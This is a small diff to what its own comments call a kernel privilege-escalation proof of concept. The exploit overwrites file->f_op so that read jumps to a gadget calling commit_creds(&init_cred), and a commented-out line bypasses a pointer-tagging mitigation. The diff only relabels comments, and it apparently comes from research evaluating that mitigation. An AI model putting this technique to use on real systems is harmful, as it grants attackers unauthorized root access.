@@ -1,4 +1,4 @@
-// FZY: Privilege escalation PoC that overwrites file->f_op (an indirect function pointer)
+// SDP: Privilege escalation PoC that overwrites file->f_op (an indirect function pointer)
 // to redirect file->f_op->read to a gadget that calls commit_creds(&init_cred), granting
 // the calling process root credentials.
 //
@@ -81,7 +81,7 @@ static unsigned long follow_ptr(int fd, unsigned long ptr_addr, int mode,
   printf("[+] %s @ 0x%lx = 0x%lx\n", label, ptr_addr, val);
   if (mode != 0) {
     printf("[+]   SDP mode: tagged value -> 0x%lx\n", val);
-    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
+    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
     // val |= 0xFFFF000000000000UL;
   }
   return val;
